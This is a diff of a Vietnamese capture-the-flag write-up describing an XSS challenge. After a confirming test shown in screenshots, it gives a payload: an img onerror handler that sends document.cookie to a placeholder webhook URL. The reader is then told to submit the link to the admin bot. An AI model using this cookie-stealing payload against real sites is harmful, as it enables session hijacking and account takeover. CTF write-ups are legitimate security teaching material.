@@ -123,12 +123,19 @@ app.get('/style.css', (_req, res) => {
 app.listen(3000)
 ```
 # Hướng làm: 
+
 - Nhìn bài này thì em nghĩ ngay đến xss vì theo như code, ta cần có cookie để vào được path /flag để lấy flag, thử thôi
+
 # Khai thác:
+
 - Trước tiên vẫn là phải thử:
+
 ![Screenshot (470)](https://github.com/ductohno/ehc-adward/assets/152991010/6e9af75e-619b-485f-986e-f2193081cef3)
+
 - Và ngay lập thức thông báo hiện ra:
+
 ![Screenshot (471)](https://github.com/ductohno/ehc-adward/assets/152991010/73478682-da8e-46cb-9b43-1c1bf932e335)
+
 - Xss confirm, giờ chúng ta sẽ chuyển payload thành ```<img src=0 onerror='document.location="Your_Link(webhook)?cmd="+document.cookie'/>``` để chuyển hướng
 - Nên bật sẵn burp suite
 - Sau khi bấm submit thì gửi link đó cho con bot
